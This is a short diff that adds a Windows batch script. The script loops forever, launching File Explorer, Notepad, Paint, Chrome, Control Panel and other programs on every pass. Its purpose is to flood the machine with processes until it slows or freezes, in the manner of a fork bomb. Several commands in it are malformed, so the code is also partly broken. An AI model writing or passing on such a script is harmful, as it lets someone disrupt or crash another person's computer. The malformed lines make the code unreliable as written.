@@ -1,0 +1,11 @@
+echo off
+:x
+start explorer
+start notepad
+start mspaint
+start chrome
+start control
+start task manager
+start settings
+start panel
+goto x loop
